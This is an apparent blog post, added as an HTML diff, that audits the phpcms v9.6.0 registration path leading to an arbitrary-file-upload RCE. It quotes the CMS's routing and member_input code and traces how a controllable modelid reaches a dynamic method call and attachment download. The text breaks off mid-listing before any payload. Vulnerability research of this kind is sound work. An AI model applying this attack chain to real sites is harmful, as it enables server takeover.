@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="phpcms v9.6.0代码审计练习" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            phpcms v9.6.0代码审计练习
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="post-toc-text">路由分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#payload"><span class="post-toc-text">payload</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>v9.6.0</p>
+<p>任意文件上传rce</p>
+</blockquote>
+<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>首先理清路由逻辑</p>
+<p>比如<code>http://192.168.91.39:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code></p>
+<p>这里的m就是module，c就是类，a就是方法</p>
+<p>对应的就是<code>phpcms/modules/member/index.php</code>文件里的register方法</p>
+<p>这套代码分为用户端和管理端，但是两个的路由写法都是一样的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151754866.png" title="image-20240115175358738" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151754866.png" alt="image-20240115175358738"></a></p>
+<p>代码开头是传统mvc模式，通过一个文件来引入其他文件</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  index.php PHPCMS 入口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2010 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2010-6-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//PHPCMS根目录</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PHPCMS_PATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">&#x27;/phpcms/base.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">pc_base::<span class="title function_ invoke__">creat_app</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在处理用户注册的函数中存在撸点，<code>phpcms/modules/member/index.php</code>::<code>register()</code></p>
+<p>代码太长，只看关键函数</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151802756.png" title="image-20240115180241711" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151802756.png" alt="image-20240115180241711"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//附表信息验证 通过模型获取会员信息</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$member_input</span> = <span class="keyword">new</span> <span class="title function_ invoke__">member_input</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);		</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>] = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;new_html_special_chars&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user_model_info</span> = <span class="variable">$member_input</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);				        				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的<code>$userinfo[&#39;modelid&#39;]</code>是我们可控的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151803333.png" title="image-20240115180317258" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151803333.png" alt="image-20240115180317258"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>] = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;modelid&#x27;</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;modelid&#x27;</span>]) : <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
+
+<p>开启xdebug，跟进<code>member_input</code>类</p>
+<p>首先是他的构造函数</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151805228.png" title="image-20240115180508176" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151805228.png" alt="image-20240115180508176"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$modelid</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db = pc_base::<span class="title function_ invoke__">load_model</span>(<span class="string">&#x27;sitemodel_field_model&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db_pre = <span class="variable language_">$this</span>-&gt;db-&gt;db_tablepre;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;modelid = <span class="variable">$modelid</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;fields = <span class="title function_ invoke__">getcache</span>(<span class="string">&#x27;model_field_&#x27;</span>.<span class="variable">$modelid</span>,<span class="string">&#x27;model&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化附件类</span></span><br><span class="line">    pc_base::<span class="title function_ invoke__">load_sys_class</span>(<span class="string">&#x27;attachment&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;siteid = param::<span class="title function_ invoke__">get_cookie</span>(<span class="string">&#x27;siteid&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;attachment = <span class="keyword">new</span> <span class="title function_ invoke__">attachment</span>(<span class="string">&#x27;content&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="variable">$this</span>-&gt;siteid);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是通过<code>getcache(&#39;model_field_&#39;.$modelid,&#39;model&#39;)</code>来给<code>$this-&gt;fields</code>赋值</p>
+<p>而且通过调试，可以知道<code>$this-&gt;fields</code>的值是根据<code>$modelid</code>的值来改变的，这里后面会用到</p>
+<p>执行后，可以发现$this-&gt;field被赋值为以下内容</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151937651.png" title="image-20240115193717574" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151937651.png" alt="image-20240115193717574"></a></p>
+<p>跳出这个函数后，继续跟进</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151938005.png" title="image-20240115193825975" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151938005.png" alt="image-20240115193825975"></a></p>
+<p>这里传入get函数的值也是可控的，进入<code>get()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span> = <span class="title function_ invoke__">trim_script</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$model_cache</span> = <span class="title function_ invoke__">getcache</span>(<span class="string">&#x27;member_model&#x27;</span>, <span class="string">&#x27;commons&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;table_name = <span class="variable language_">$this</span>-&gt;db_pre.<span class="variable">$model_cache</span>[<span class="variable language_">$this</span>-&gt;modelid][<span class="string">&#x27;tablename&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$debar_filed</span> = <span class="keyword">array</span>(<span class="string">&#x27;catid&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;style&#x27;</span>,<span class="string">&#x27;thumb&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;islink&#x27;</span>,<span class="string">&#x27;description&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$field</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;islink&#x27;</span>]==<span class="number">1</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$field</span>,<span class="variable">$debar_filed</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$field</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$field</span>);</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$minlength</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;minlength&#x27;</span>];</span><br><span class="line">            <span class="variable">$maxlength</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;maxlength&#x27;</span>];</span><br><span class="line">            <span class="variable">$pattern</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">            <span class="variable">$errortips</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;errortips&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$errortips</span>)) <span class="variable">$errortips</span> = <span class="string">&quot;<span class="subst">$name</span> 不符合要求！&quot;</span>;</span><br><span class="line">            <span class="variable">$length</span> = <span class="keyword">empty</span>(<span class="variable">$value</span>) ? <span class="number">0</span> : <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$minlength</span> &amp;&amp; <span class="variable">$length</span> &lt; <span class="variable">$minlength</span> &amp;&amp; !<span class="variable">$isimport</span>) <span class="title function_ invoke__">showmessage</span>(<span class="string">&quot;<span class="subst">$name</span> 不得少于 <span class="subst">$minlength</span> 个字符！&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$field</span>, <span class="variable">$this</span>-&gt;fields)) <span class="title function_ invoke__">showmessage</span>(<span class="string">&#x27;模型中不存在&#x27;</span>.<span class="variable">$field</span>.<span class="string">&#x27;字段&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$maxlength</span> &amp;&amp; <span class="variable">$length</span> &gt; <span class="variable">$maxlength</span> &amp;&amp; !<span class="variable">$isimport</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">showmessage</span>(<span class="string">&quot;<span class="subst">$name</span> 不得超过 <span class="subst">$maxlength</span> 个字符！&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">str_cut</span>(<span class="variable">$value</span>, <span class="variable">$maxlength</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pattern</span> &amp;&amp; <span class="variable">$length</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$value</span>) &amp;&amp; !<span class="variable">$isimport</span>) <span class="title function_ invoke__">showmessage</span>(<span class="variable">$errortips</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;isunique&#x27;</span>] &amp;&amp; <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">get_one</span>(<span class="keyword">array</span>(<span class="variable">$field</span>=&gt;<span class="variable">$value</span>),<span class="variable">$field</span>) &amp;&amp; ROUTE_A != <span class="string">&#x27;edit&#x27;</span>) <span class="title function_ invoke__">showmessage</span>(<span class="string">&quot;<span class="subst">$name</span> 的值不得重复！&quot;</span>);</span><br><span class="line">            <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;formtype&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$func</span>)) <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$func</span>(<span class="variable">$field</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$info</span>[<span class="variable">$field</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>trim_script函数是对xss的防御</p>
+<p>下面到<code>foreach($data as $field=&gt;$value)</code>，这里的$data就是我们传入的info参数</p>
+<p>所以这两个值都是我们可以控制的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151948933.png" title="image-20240115194826888" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151948933.png" alt="image-20240115194826888"></a></p>
+<p>这个地方会判断birthday键是否在<code>$this-&gt;fields</code>里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$field</span>, <span class="variable">$this</span>-&gt;fields)) <span class="title function_ invoke__">showmessage</span>(<span class="string">&#x27;模型中不存在&#x27;</span>.<span class="variable">$field</span>.<span class="string">&#x27;字段&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;fields</code>就是前面在<code>getcache()</code>里赋的值</p>
+<p>继续跟进到这</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151955923.png" title="image-20240115195537893" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151955923.png" alt="image-20240115195537893"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;formtype&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$func</span>)) <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$func</span>(<span class="variable">$field</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>
+
+<p>他会取<code>$this-&gt;fields[$field][&#39;formtype&#39;]</code>的值，并通过动态函数来执行函数，且<code>$field</code>和<code>$value</code>的值都可以控制</p>
+<p>跟进后可以知道，当modelid为10时，<code>$this-&gt;fields[$field][&#39;formtype&#39;]</code>的值是datetime</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151958262.png" title="image-20240115195803233" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401151958262.png" alt="image-20240115195803233"></a></p>
+<p>现在半场总结一下，我们可以控制的数据流有</p>
+<ul>
+<li>modelid</li>
+<li>field</li>
+<li>value</li>
+</ul>
+<p>然后需要找到<code>$this-&gt;fields</code>是如何赋值的</p>
+<p>在这里可以看table_name&#x3D;v9_model_field</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152005353.png" title="image-20240115200526256" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152005353.png" alt="image-20240115200526256"></a></p>
+<p>由于这里是缓存的操作，而且我太菜了看不到源码，所以猜测这个的值是从数据库取的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152007296.png" title="image-20240115200715208" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152007296.png" alt="image-20240115200715208"></a></p>
+<p>通过修改modelid和info的值，可以验证我的猜测</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152012313.png" title="image-20240115201253260" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152012313.png" alt="image-20240115201253260"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152011565.png" title="image-20240115201117472" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152011565.png" alt="image-20240115201117472"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152012307.png" title="image-20240115201242155" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152012307.png" alt="image-20240115201242155"></a></p>
+<p>发现确实是这样的，所以可以通过修改modelid选择最后动态函数执行的函数</p>
+<p>最后的撸点在<code>editor()</code>，他对应的modelid为3，$field为content</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$setting</span> = <span class="title function_ invoke__">string2array</span>(<span class="variable">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;setting&#x27;</span>]);</span><br><span class="line">    <span class="variable">$enablesaveimage</span> = <span class="variable">$setting</span>[<span class="string">&#x27;enablesaveimage&#x27;</span>];</span><br><span class="line">    <span class="variable">$site_setting</span> = <span class="title function_ invoke__">string2array</span>(<span class="variable">$this</span>-&gt;site_config[<span class="string">&#x27;setting&#x27;</span>]);</span><br><span class="line">    <span class="variable">$watermark_enable</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$site_setting</span>[<span class="string">&#x27;watermark_enable&#x27;</span>]);</span><br><span class="line">    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;attachment-&gt;<span class="title function_ invoke__">download</span>(<span class="string">&#x27;content&#x27;</span>, <span class="variable">$value</span>,<span class="variable">$watermark_enable</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>download()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span 